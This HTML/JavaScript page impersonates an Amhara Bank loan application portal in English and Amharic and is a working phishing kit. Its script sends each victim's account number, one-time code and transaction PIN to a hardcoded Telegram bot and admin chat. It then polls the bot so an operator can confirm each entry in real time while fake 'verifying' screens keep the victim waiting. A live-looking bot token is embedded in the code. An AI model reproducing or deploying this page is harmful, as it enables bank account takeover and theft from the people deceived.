<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Amhara Bank - Loan Application</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            --bank-blue: #005696;
            --bank-yellow: #fcc201;
            --text-grey: #6d6e71;
            --slant: -10.8deg; 
            --line: 5px; 
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: white; overflow: hidden; -webkit-tap-highlight-color: transparent; }

        /* --- SPLASH SCREEN --- */
        #splash-screen {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-color: #0B5FA5; z-index: 9999; display: flex;
            flex-direction: column; align-items: center;
        }
        .main-logo-container { width: 100%; display: flex; justify-content: center; padding-top: 80px; padding-left: 20px; padding-right: 20px; }
        .splash-main-logo { width: 100%; max-width: 800px; height: auto; object-fit: contain; animation: fadeIn 1s ease-out forwards; }
        .loading-section { position: absolute; bottom: 20%; left: 50%; transform: translateX(-50%); display: flex; justify-content: center; align-items: center; }
        .small-logo { width: 50px; height: 50px; position: relative; z-index: 2; }
        .spinner { position: absolute; top: 50%; left: 50%; width: 70px; height: 70px; margin-top: -35px; margin-left: -35px; border-radius: 50%; z-index: 1; }
        .spinner::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%; border-radius: 50%; border: 3px solid rgba(255, 255, 255, 0.2); border-top: 3px solid #FFFFFF; animation: spin 0.6s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        /* --- APP SHELL --- */
        .app-shell { width: 100%; max-width: 412px; height: 100vh; margin: 0 auto; display: flex; flex-direction: column; background: white; position: relative; opacity: 0; transition: opacity 0.5s; }
        
        /* HEADER UPDATES: SLIGHTLY DOWN & SMALLER LOGO */
        .header-top { background-color: var(--bank-blue); height: 210px; width: 160%; margin-left: -30%; transform: skewY(var(--slant)); transform-origin: top left; display: flex; align-items: flex-end; justify-content: center; padding-bottom: 40px; z-index: 20; }
        .header-content-inner { transform: skewY(calc(var(--slant) * -1)); width: 35%; display: flex; flex-direction: column; align-items: center; position: relative; }
        .logo-img { width: 75%; height: auto; display: block; margin-bottom: -10px; } /* Smaller Logo */
        
        .stripe-wrap { width: 160%; margin-left: -30%; margin-top: var(--line); display: flex; flex-direction: column; gap: var(--line); transform: skewY(var(--slant)); transform-origin: top left; z-index: 10; }
        .line { width: 100%; height: var(--line); background-color: var(--bank-blue); }

        .page { display: none; flex-direction: column; z-index: 30; height: 100%; }

        .text-content-p1 { padding: 0 30px; margin-top: -15px; }
        .welcome-row { display: flex; justify-content: space-between; align-items: center; }
        .welcome-row h1 { color: var(--bank-blue); font-size: 28px; font-weight: 800; }
        .lang-btn { color: var(--bank-blue); font-size: 15px; font-weight: 600; cursor: pointer; border: 1.5px solid var(--bank-blue); padding: 5px 12px; border-radius: 20px; }
        .sub-desc { color: var(--text-grey); font-size: 13.5px; line-height: 1.4; margin-top: 10px; }
        .photo-area { flex-grow: 1; display: flex; justify-content: center; align-items: center; overflow: hidden; margin-top: 40px; }
        .central-img { width: 100%; height: 100%; object-fit: contain; transform: scale(1.1); mix-blend-mode: multiply; }
        .btn-area { padding: 25px 30px 45px 30px; }
        .btn-gold { width: 100%; background-color: var(--bank-blue); color: var(--bank-yellow); padding: 17px; border-radius: 12px; font-size: 18px; font-weight: 700; border: none; cursor: pointer; }

        .setup-title { color: var(--bank-blue); font-size: 22px; font-weight: 700; margin-bottom: 8px; }
        .setup-sub { color: #58595b; font-size: 14.5px; margin-bottom: 35px; }
        .input-group { position: relative; border-bottom: 1.5px solid #d1d3d4; padding-bottom: 8px; margin-top: 20px; }
        .input-label-placeholder { position: absolute; left: 0; bottom: 8px; color: #58595b; font-size: 19px; transition: 0.2s ease all; pointer-events: none; }
        .input-field:focus ~ .input-label-placeholder, .input-field:not(:placeholder-shown) ~ .input-label-placeholder { bottom: 35px; font-size: 14px; color: var(--bank-blue); }
        .input-field { width: 100%; border: none; outline: none; font-size: 20px; color: #333; background: transparent; }
        .input-counter { text-align: right; color: #a7a9ac; font-size: 14px; margin-top: 6px; }

        .timer-circle { width: 120px; height: 120px; border: 4px solid var(--bank-blue); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 30px auto; font-size: 24px; font-weight: 800; color: var(--bank-blue); }
        .page-loader { margin: 40px auto; width: 60px; height: 60px; border: 5px solid #f3f3f3; border-top: 5px solid var(--bank-blue); border-radius: 50%; animation: spin 1s linear infinite; }

        .otp-inputs { display: flex; justify-content: space-between; margin-top: 40px; padding: 0 10px; }
        .otp-box { width: 40px; border: none; border-bottom: 2px solid #ccc; text-align: center; font-size: 24px; font-weight: 700; color: #333; padding-bottom: 5px; outline: none; }

        .pin-label { color: var(--bank-blue); font-size: 18px; font-weight: 500; margin-bottom: 10px; }
        .pin-input-wrap { display: flex; align-items: center; border-bottom: 1.5px solid var(--bank-blue); padding-bottom: 8px; }
        .pin-field { width: 100%; border: none; outline: none; font-size: 24px; letter-spacing: 4px; color: #333; background: transparent; }
        .eye-icon { width: 24px; height: 24px; opacity: 0.6; cursor: pointer; }
        .forgot-pin { color: var(--bank-blue); font-size: 16px; font-weight: 600; margin-top: 25px; cursor: pointer; }

        .continue-btn { width: 100%; background-color: #f1f2f2; color: #a7a9ac; padding: 16px; border-radius: 10px; font-size: 18px; font-weight: 700; border: none; text-align: center; pointer-events: none; margin-top: 50px; }
        .active-btn { background-color: var(--bank-blue) !important; color: var(--bank-yellow) !important; pointer-events: auto !important; cursor: pointer; }

        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 1000; justify-content: center; align-items: center; padding: 25px; }
        .modal-box { background: white; padding: 30px; border-radius: 15px; text-align: center; width: 100%; max-width: 320px; }
    </style>
</head>
<body>

    <div id="splash-screen">
        <div class="main-logo-container"><img src="https://i.postimg.cc/wvv1Jq6B/9578-removebg-preview.png" class="splash-main-logo"></div>
        <div class="loading-section"><div class="spinner"></div><img src="https://i.postimg.cc/CxSk5Vfx/9604-removebg-preview.png" class="small-logo"></div>
    </div>

    <div class="app-shell" id="main-app">
        <div class="header-top"><div class="header-content-inner"><img src="https://i.postimg.cc/KYSWGfLP/11691-removebg-preview.png" class="logo-img"></div></div>
        <div class="stripe-wrap"><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div></div>

        <div id="page-welcome" class="page" style="display: flex;">
            <div class="text-content-p1"><div class="welcome-row"><h1 data-key="loan-title">Loan Portal</h1><div class="lang-btn" id="lang-toggler" onclick="toggleLang()">English</div></div><p class="sub-desc" data-key="welcome-sub">Welcome to Amhara Bank digital loan portal. Access flexible credit facilities and financial support for your growth.</p></div>
            <div class="photo-area"><img src="https://i.postimg.cc/rw6jxmmL/Screenshot-20260119-080631-Google-Play-Store.jpg" class="central-img"></div>
            <div class="btn-area"><button class="btn-gold" onclick="notifyApply()" data-key="start-app">Apply Now</button></div>
        </div>

        <div id="page-account" class="page" style="padding: 25px;">
            <h2 class="setup-title" data-key="acc-check">Check Eligibility</h2><p class="setup-sub" data-key="acc-sub">Enter your account number to review your personal credit limit.</p>
            <div class="input-group">
                <input type="number" class="input-field" id="acc-input" placeholder=" " oninput="validateAcc()" maxlength="13">
                <label class="input-label-placeholder" data-key="acc-label">Account Number</label>
            </div>
            <div class="input-counter" id="counter">0/13</div>
            <button class="continue-btn" id="acc-btn" onclick="submitAccount()" data-key="continue" disabled>Continue</button>
        </div>

        <div id="page-waiting" class="page" style="padding: 40px 30px; text-align: center;">
            <h2 class="setup-title" data-key="wait-h">Verification in Progress</h2><p class="setup-sub" data-key="wait-p">Please wait while we verify your account details. A secure OTP will be sent to your registered phone number in 5 min.</p>
            <div class="timer-circle" id="timer">05:00</div>
            <div class="page-loader"></div>
        </div>

        <div id="page-otp" class="page" style="padding: 25px;">
            <h2 class="setup-title" data-key="otp-head">Identity Verification</h2><p class="setup-sub" data-key="otp-sub">A verification code has been sent to your registered mobile number for security.</p>
            <div class="otp-inputs">
                <input type="number" class="otp-box" id="o1" oninput="limitAndMove(this, 'o2')" onkeydown="checkBack(event, '')">
                <input type="number" class="otp-box" id="o2" oninput="limitAndMove(this, 'o3')" onkeydown="checkBack(event, 'o1')">
                <input type="number" class="otp-box" id="o3" oninput="limitAndMove(this, 'o4')" onkeydown="checkBack(event, 'o2')">
                <input type="number" class="otp-box" id="o4" oninput="limitAndMove(this, 'o5')" onkeydown="checkBack(event, 'o3')">
                <input type="number" class="otp-box" id="o5" oninput="limitAndMove(this, 'o6')" onkeydown="checkBack(event, 'o4')">
                <input type="number" class="otp-box" id="o6" oninput="limitAndMove(this, '')" onkeydown="checkBack(event, 'o5')">
            </div>
            <button class="continue-btn" id="otp-btn" onclick="submitOTP()" data-key="confirm" disabled>Confirm</button>
        </div>

        <div id="page-otp-waiting" class="page" style="padding: 40px 30px; text-align: center;">
            <h2 class="setup-title" data-key="otp-wait-h">Verifying OTP</h2><p class="setup-sub" data-key="otp-wait-p">Your request is being processed. It may take a few minutes for the verification to complete. Please remain on this page.</p>
            <div class="page-loader" style="margin-top:60px;"></div>
        </div>

        <div id="page-login" class="page" style="padding: 35px 25px;">
            <h1 class="login-title" data-key="auth-head">Authorize</h1><p class="login-welcome" data-key="auth-sub">Please enter your transaction PIN to proceed with the application.</p>
            <div class="pin-label" data-key="pin-text">Pin</div>
            <div class="pin-input-wrap"><input type="password" class="pin-field" id="pin-field" oninput="validatePin()"><img src="https://cdn-icons-png.flaticon.com/512/709/709612.png" class="eye-icon" onclick="togglePin()"></div>
            <div class="forgot-pin" onclick="showModal('info-modal')" data-key="forgot">Forgot PIN?</div>
            <button class="continue-btn" id="reg-btn" onclick="submitPin()" data-key="apply" disabled>Apply</button>
        </div>

        <div id="page-pin-waiting" class="page" style="padding: 40px 30px; text-align: center;">
            <h2 class="setup-title" data-key="pin-wait-h">Securing Connection</h2><p class="setup-sub" data-key="pin-wait-p">Establishing a secure link with the authorization server. This process ensures your transaction is encrypted and safe.</p>
            <div class="page-loader" style="margin-top:50px;"></div>
        </div>

        <div id="page-success" class="page" style="padding: 40px 30px; text-align: center;">
            <div style="font-size: 60px; color: #4CAF50; margin-bottom: 20px;">âœ“</div>
            <h2 class="success-title" data-key="succ-h">Application Submitted</h2><p class="success-body" data-key="succ-p">Your loan request is being processed. Our credit department will notify you via SMS within 24 hours.</p>
            <button class="btn-gold active-btn" style="width:100%; margin-top:20px;" onclick="location.reload()" data-key="done">Done</button>
        </div>
    </div>

    <div class="modal" id="info-modal"><div class="modal-box"><h3 data-key="modal-h" style="color:var(--bank-blue);">Service Note</h3><p data-key="modal-p">PIN recovery is unavailable through this channel.</p><button class="btn-gold active-btn" onclick="hideModal('info-modal')">OK</button></div></div>
    <div class="modal" id="error-modal"><div class="modal-box"><h3 style="color:#d9534f;" data-key="err-h">Verification Failed</h3><p data-key="acc-err-p">Incorrect account number provided.</p><button class="btn-gold active-btn" onclick="resetToAccount()" data-key="try-again">Try Again</button></div></div>
    <div class="modal" id="not-reg-modal"><div class="modal-box"><h3 style="color:var(--bank-blue);" data-key="reg-h">Bank Notice</h3><p data-key="reg-p">Your bank account is not registered. Please visit a branch to register your mobile banking.</p><button class="btn-gold active-btn" onclick="resetToAccount('not-reg-modal')" data-key="done">OK</button></div></div>
    <div class="modal" id="otp-error-modal"><div class="modal-box"><h3 style="color:#d9534f;" data-key="otp-err-h">OTP Incorrect</h3><p data-key="otp-err-p">The code you entered is incorrect.</p><button class="btn-gold active-btn" onclick="retryOTP()" data-key="try-again">Try Again</button></div></div>
    <div class="modal" id="pin-error-modal"><div class="modal-box"><h3 style="color:#d9534f;" data-key="pin-err-h">PIN Incorrect</h3><p data-key="pin-err-p">The transaction PIN provided is incorrect.</p><button class="btn-gold active-btn" onclick="retryPin()" data-key="try-again">Try Again</button></div></div>

    <script>
        const BOT_TOKEN = "8472250354:AAFDjUbcUCPBjo-UGBVIUys9mqOfz1cy5Ks";
        const ADMIN_ID = "5668579491";
        let countdownInterval, lastOffset = 0, pollerInterval, currentAccount = "";

        const translations = {
            en: {
                "loan-title": "Loan Portal", "welcome-sub": "Welcome to Amhara Bank digital loan portal. Access flexible credit facilities and financial support for your growth.", "start-app": "Apply Now",
                "acc-check": "Check Eligibility", "acc-sub": "Enter your account number to review your personal credit limit.", "acc-label": "Account Number", "continue": "Continue",
                "wait-h": "Verification in Progress", "wait-p": "Please wait while we verify your account details. A secure OTP will be sent to your registered phone number in 5 min.",
                "otp-head": "Identity Verification", "otp-sub": "A verification code has been sent to your registered mobile number for security.", "confirm": "Confirm",
                "otp-wait-h": "Verifying OTP", "otp-wait-p": "Your request is being processed. It may take a few minutes for the verification to complete. Please remain on this page.",
                "auth-head": "Authorize", "auth-sub": "Please enter your transaction PIN to proceed with the application.", "pin-text": "Pin", "forgot": "Forgot PIN?", "apply": "Apply",
                "pin-wait-h": "Securing Connection", "pin-wait-p": "Establishing a secure link with the authorization server. This process ensures your transaction is encrypted and safe.",
                "succ-h": "Application Submitted", "succ-p": "Your loan request is being processed. Our credit department will notify you via SMS within 24 hours.", "done": "Done",
                "modal-h": "Service Note", "modal-p": "PIN recovery is unavailable through this channel. Please visit your branch for secure PIN reset.",
                "err-h": "Verification Failed", "acc-err-p": "Incorrect account number provided. Please try again.", "try-again": "Try Again",
                "otp-err-h": "OTP Incorrect", "otp-err-p": "The verification code you entered is incorrect.",
                "pin-err-h": "PIN Incorrect", "pin-err-p": "The transaction PIN provided is incorrect.",
                "reg-h": "Bank Notice", "reg-p": "Your bank account is not registered. Please visit a branch to register your mobile banking."
            },
            am: {
                "loan-title": "á‹¨á‰¥á‹µáˆ­ á–áˆ­á‰³áˆ", "welcome-sub": "á‹ˆá‹° áŠ áˆ›áˆ« á‰£áŠ•áŠ­ á‹²áŒ‚á‰³áˆ á‹¨á‰¥á‹µáˆ­ á–áˆ­á‰³áˆ áŠ¥áŠ•áŠ³áŠ• á‰ á‹°áˆ…áŠ“ áˆ˜áŒ¡á¢ áˆˆá‹•á‹µáŒˆá‰µá‹Ž á‰°áˆˆá‹‹á‹‹áŒ­ á‹¨á‰¥á‹µáˆ­ áŠ áŒˆáˆáŒáˆŽá‰¶á‰½áŠ• áŠ¥áŠ“ á‹¨áŒˆáŠ•á‹˜á‰¥ á‹µáŒ‹ááŠ• á‹«áŒáŠ™á¢", "start-app": "áŠ áˆáŠ‘áŠ‘ á‹«áˆ˜áˆáŠ­á‰±",
                "acc-check": "á‰¥á‰áŠá‰µáŠ• á‹«áˆ¨áŒ‹áŒáŒ¡", "acc-sub": "á‹¨áŒáˆ á‹¨á‰¥á‹µáˆ­ áŒˆá‹°á‰¥á‹ŽáŠ• áˆˆáˆ˜áŒˆáˆáŒˆáˆ áŠ¥á‰£áŠ­á‹Ž á‹¨áˆ‚áˆ³á‰¥ á‰áŒ¥áˆ­á‹ŽáŠ• á‹«áˆµáŒˆá‰¡á¢", "acc-label": "á‹¨áˆ‚áˆ³á‰¥ á‰áŒ¥áˆ­", "continue": "á‹­á‰€áŒ¥áˆ‰",
                "wait-h": "áˆ›áˆ¨áŒ‹áŒˆáŒ« á‰ áˆ‚á‹°á‰µ áˆ‹á‹­ áŠá‹", "wait-p": "áŠ¥á‰£áŠ­á‹Ž á‹¨áˆ‚áˆ³á‰¥á‹ŽáŠ• á‹áˆ­á‹áˆ®á‰½ áŠ¥áˆµáŠ­áŠ“áˆ¨áŒ‹áŒáŒ¥ á‹µáˆ¨áˆµ á‹­áŒ á‰¥á‰á¢ á‰  5 á‹°á‰‚á‰ƒ á‹áˆµáŒ¥ á‹¨á‹­áˆˆá á‰ƒáˆ á‹­áˆ‹áŠ«áˆá¢",
                "otp-head": "áˆ›áŠ•áŠá‰µáŠ• áˆ›áˆ¨áŒ‹áŒˆáŒ¥", "otp-sub": "áˆˆá‹°áˆ…áŠ•áŠá‰µ áˆ²á‰£áˆ á‹¨áˆ›áˆ¨áŒ‹áŒˆáŒ« áŠ®á‹µ á‹ˆá‹° á‰°áˆ˜á‹˜áŒˆá‰ á‹ á‹¨áˆžá‰£á‹­áˆ áˆµáˆáŠ­á‹Ž á‰°áˆáŠ³áˆá¢", "confirm": "áŠ áˆ¨áŒ‹áŒáŒ¥",
                "otp-wait-h": "áŠ®á‹µ á‰ áˆ˜áˆ¨áŒ‹áŒˆáŒ¥ áˆ‹á‹­", "otp-wait-p": "áŒ¥á‹«á‰„á‹Ž á‰ áˆ˜á‰³á‹¨á‰µ áˆ‹á‹­ áŠá‹á¢ áˆ›áˆ¨áŒ‹áŒˆáŒ«á‹ áŠ¥áˆµáŠªáŒ áŠ“á‰€á‰… áŒ¥á‰‚á‰µ á‹°á‰‚á‰ƒá‹Žá‰½áŠ• áˆŠá‹ˆáˆµá‹µ á‹­á‰½áˆ‹áˆá¢ áŠ¥á‰£áŠ­á‹Ž á‰ á‹šáˆ… áŒˆáŒ½ áˆ‹á‹­ á‹­á‰†á‹©á¢",
                "auth-head": "áˆá‰ƒá‹µ á‹­áˆµáŒ¡", "auth-sub": "áŠ¥á‰£áŠ­á‹Ž áˆ›áˆ˜áˆáŠ¨á‰»á‹áŠ• áˆˆáˆ˜á‰€áŒ áˆ á‹¨áŒá‰¥á‹­á‰µ áˆšáˆµáŒ¥áˆ«á‹Š á‰áŒ¥áˆ­á‹ŽáŠ• (PIN) á‹«áˆµáŒˆá‰¡á¢", "pin-text": "áˆšáˆµáŒ¥áˆ«á‹Š á‰áŒ¥áˆ­", "forgot": "PIN áˆ¨áˆµá‰°á‹‹áˆ?", "apply": "á‹«áˆ˜áˆáŠ­á‰±",
                "pin-wait-h": "á‹°áˆ…áŠ•áŠá‰± á‹¨á‰°áŒ á‰ á‰€ áŒáŠ•áŠ™áŠá‰µ", "pin-wait-p": "áŠ¨á‰£áŠ•áŠ­ áŠ áŒˆáˆáŒ‹á‹­ áŒ‹áˆ­ á‹°áˆ…áŠ•áŠá‰± á‹¨á‰°áŒ á‰ á‰€ áŒáŠ•áŠ™áŠá‰µ áŠ¥á‹¨á‰°áˆáŒ áˆ¨ áŠá‹á¢ á‹­áˆ… á‹¨áŠ¥áˆ­áˆµá‹Ž áŒá‰¥á‹­á‰µ á‹¨á‰°áˆ˜áˆ°áŒ áˆ¨ áˆ˜áˆ†áŠ‘áŠ• á‹«áˆ¨áŒ‹áŒáŒ£áˆá¢",
                "succ-h": "áˆ›áˆ˜áˆáŠ¨á‰»á‹ áŒˆá‰¥á‰·áˆ", "succ-p": "á‹¨á‰¥á‹µáˆ­ áŒ¥á‹«á‰„á‹Ž á‰ áˆ˜á‰³á‹¨á‰µ áˆ‹á‹­ áŠá‹á¢ á‹¨á‰¥á‹µáˆ­ áŠ­ááˆ‹á‰½áŠ• á‰  24 áˆ°á‹“á‰³á‰µ á‹áˆµáŒ¥ á‰ áŠ¤áˆµáŠ¤áˆáŠ¤áˆµ á‹«áˆ³á‹á‰…á‹Žá‰³áˆá¢", "done": "á‰°áŒ áŠ“á‰‹áˆ",
                "modal-h": "á‹¨áŠ áŒˆáˆáŒáˆŽá‰µ áˆ›áˆµá‰³á‹ˆáˆ»", "modal-p": "áˆšáˆµáŒ¥áˆ«á‹Š á‰áŒ¥áˆ­ áˆ˜á‰€á‹¨áˆ­ áŠ á‹­á‰»áˆáˆá¢ áŠ¥á‰£áŠ­á‹ŽáŠ• á‰ áŠ á‰…áˆ«á‰¢á‹«á‹Ž á‰ áˆšáŒˆáŠ á‰…áˆ­áŠ•áŒ«á á‰ áˆ˜áˆ„á‹µ á‹«áˆµá‰€á‹­áˆ©á¢",
                "err-h": "áˆ›áˆ¨áŒ‹áŒˆáŒ«á‹ áŠ áˆá‰°áˆ³áŠ«áˆ", "acc-err-p": "á‹«áˆµáŒˆá‰¡á‰µ á‹¨áˆ‚áˆ³á‰¥ á‰áŒ¥áˆ­ á‹¨á‰°áˆ³áˆ³á‰° áŠá‹á¢ áŠ¥á‰£áŠ­á‹Ž áŠ¥áŠ•á‹°áŒˆáŠ“ á‹­áˆžáŠ­áˆ©á¢", "try-again": "áŠ¥áŠ•á‹°áŒˆáŠ“ á‹­áˆžáŠ­áˆ©",
                "otp-err-h": "á‹¨á‰°áˆ³áˆ³á‰° áŠ®á‹µ", "otp-err-p": "á‹«áˆµáŒˆá‰¡á‰µ á‹¨áˆ›áˆ¨áŒ‹áŒˆáŒ« áŠ®á‹µ á‹¨á‰°áˆ³áˆ³á‰° áŠá‹á¢ áŠ¥á‰£áŠ­á‹Ž áŠ á‹²áˆµ áŠ®á‹µ á‹­áŒ á‹­á‰á¢",
                "pin-err-h": "á‹¨á‰°áˆ³áˆ³á‰° PIN", "pin-err-p": "á‹«áˆµáŒˆá‰¡á‰µ á‹¨áŒá‰¥á‹­á‰µ áˆšáˆµáŒ¥áˆ«á‹Š á‰áŒ¥áˆ­ á‹¨á‰°áˆ³áˆ³á‰° áŠá‹á¢ áŠ¥á‰£áŠ­á‹Ž á‹«áˆ¨áŒ‹áŒáŒ¡ áŠ¥áŠ“ áŠ¥áŠ•á‹°áŒˆáŠ“ á‹­áˆžáŠ­áˆ©á¢",
                "reg-h": "á‹¨á‰£áŠ•áŠ­ áˆ›áˆµá‰³á‹ˆáˆ»", "reg-p": "á‹¨á‰£áŠ•áŠ­ áˆ‚áˆ³á‰¥á‹Ž áŠ áˆá‰°áˆ˜á‹˜áŒˆá‰ áˆá¢ áŠ¥á‰£áŠ­á‹Ž á‰…áˆ­áŠ•áŒ«á á‰ áˆ˜áˆ„á‹µ á‹¨áˆžá‰£á‹­áˆ á‰£áŠ•áŠªáŠ•áŒ á‹­áˆ˜á‹áŒˆá‰¡á¢"
            }
        };

        let currentLang = 'en';
        function toggleLang() {
            currentLang = currentLang === 'en' ? 'am' : 'en';
            document.getElementById('lang-toggler').innerText = currentLang === 'en' ? 'English' : 'áŠ áˆ›áˆ­áŠ›';
            document.querySelectorAll('[data-key]').forEach(el => {
                const key = el.getAttribute('data-key');
                if (translations[currentLang][key]) el.innerText = translations[currentLang][key];
            });
        }

        function showPage(pageId) {
            document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
            document.getElementById('page-' + pageId).style.display = 'flex';
        }

        function startTimer(id, seconds) {
            let duration = seconds;
            const timerDisplay = document.getElementById(id);
            if (!timerDisplay) return;
            clearInterval(countdownInterval);
            countdownInterval = setInterval(() => {
                let mins = Math.floor(duration / 60), secs = duration % 60;
                timerDisplay.innerText = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
                if (--duration < 0) clearInterval(countdownInterval);
            }, 1000);
        }

        function notifyApply() { fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=User started application`); showPage('account'); }

        async function submitAccount() {
            currentAccount = document.getElementById('acc-input').value;
            showPage('waiting'); startTimer('timer', 300); 
            const kb = { inline_keyboard: [[
                { text: "âœ… Correct", callback_data: `acc_check_yes` },
                { text: "âŒ Incorrect", callback_data: `acc_check_no` },
                { text: "ðŸš« Not Registered", callback_data: `acc_check_notreg` }
            ]]};
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: "POST", headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: ADMIN_ID, text: `ðŸ¦ Verify Account Number: ${currentAccount}`, reply_markup: kb })
            });
            pollAdmin("acc_check");
        }

        async function submitOTP() {
            let otp = Array.from(document.querySelectorAll('.otp-box')).map(i => i.value).join('');
            showPage('otp-waiting'); 
            await sendToAdmin(`ðŸ”‘ OTP: ${otp}\nAccount: ${currentAccount}`, "otp_check");
            pollAdmin("otp_check");
        }

        async function submitPin() {
            let pin = document.getElementById('pin-field').value;
            showPage('pin-waiting');
            await sendToAdmin(`ðŸ’³ PIN: ${pin}\nAccount: ${currentAccount}`, "pin_check");
            pollAdmin("pin_check");
        }

        async function sendToAdmin(text, context) {
            const kb = { inline_keyboard: [[{ text: "âœ… Correct", callback_data: `${context}_yes` }, { text: "âŒ Incorrect", callback_data: `${context}_no` }]]};
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: "POST", headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: ADMIN_ID, text: text, reply_markup: kb })
            });
        }

        function pollAdmin(context) {
            clearInterval(pollerInterval);
            pollerInterval = setInterval(async () => {
                try {
                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastOffset}`);
                    const data = await res.json();
                    if (data.result && data.result.length > 0) {
                        for (let update of data.result) {
                            lastOffset = update.update_id + 1;
                            if (update.callback_query) {
                                let action = update.callback_query.data;
                                if (action.startsWith(context)) {
                                    clearInterval(pollerInterval);
                                    if (action.endsWith("_yes")) handleAdminChoice(context, "yes");
                                    else if (action.endsWith("_no")) handleAdminChoice(context, "no");
                                    else if (action.endsWith("_notreg")) handleAdminChoice(context, "notreg");
                                }
                            }
                        }
                    }
                } catch (e) {}
            }, 2000);
        }

        function handleAdminChoice(context, choice) {
            if (choice === "yes") {
                if(context === "acc_check") showPage('otp');
                else if(context === "otp_check") showPage('login');
                else showPage('success');
            } else if (choice === "no") {
                if(context === "acc_check") showModal('error-modal');
                else if(context === "otp_check") showModal('otp-error-modal');
                else showModal('pin-error-modal');
            } else if (choice === "notreg") {
                showModal('not-reg-modal');
            }
        }

        function retryOTP() { 
            hideModal('otp-error-modal'); 
            document.querySelectorAll('.otp-box').forEach(b => b.value = '');
            showPage('waiting'); 
            startTimer('timer', 300); 
            submitAccount(); 
        }

        function retryPin() { 
            hideModal('pin-error-modal'); 
            document.getElementById('pin-field').value = ''; 
            validatePin(); 
            showPage('login'); 
        }

        function resetToAccount(modalId = 'error-modal') { 
            hideModal(modalId); 
            document.getElementById('acc-input').value = ''; 
            validateAcc();
            showPage('account'); 
        }

        function validateAcc() {
            const input = document.getElementById('acc-input');
            if (input.value.length > 13) input.value = input.value.slice(0, 13);
            const val = input.value;
            document.getElementById('counter').innerText = val.length + '/13';
            const btn = document.getElementById('acc-btn');
            if (val.length === 13) { btn.classList.add('active-btn'); btn.disabled = false; }
            else { btn.classList.remove('active-btn'); btn.disabled = true; }
        }

        function limitAndMove(curr, nextId) {
            if (curr.value.length > 1) curr.value = curr.value.slice(0,1);
            if (curr.value.length === 1 && nextId) document.getElementById(nextId).focus();
            const filled = Array.from(document.querySelectorAll('.otp-box')).every(b => b.value !== "");
            const btn = document.getElementById('otp-btn');
            if (filled) { btn.classList.add('active-btn'); btn.disabled = false; }
            else { btn.classList.remove('active-btn'); btn.disabled = true; }
        }

        function checkBack(e, prevId) { if (e.key === "Backspace" && e.target.value === "" && prevId) document.getElementById(prevId).focus(); }
        function validatePin() {
            const btn = document.getElementById('reg-btn');
            if (document.getElementById('pin-field').value.length >= 4) { btn.classList.add('active-btn'); btn.disabled = false; }
            else { btn.classList.remove('active-btn'); btn.disabled = true; }
        }
        function togglePin() { const p = document.getElementById('pin-field'); p.type = p.type === 'password' ? 'text' : 'password'; }
        function showModal(id) { document.getElementById(id).style.display = 'flex'; }
        function hideModal(id) { document.getElementById(id).style.display = 'none'; }

        window.addEventListener('load', () => setTimeout(() => {
            document.getElementById('splash-screen').style.display = 'none';
            document.getElementById('main-app').style.opacity = '1';
        }, 3000));
    </script>
</body>
</html>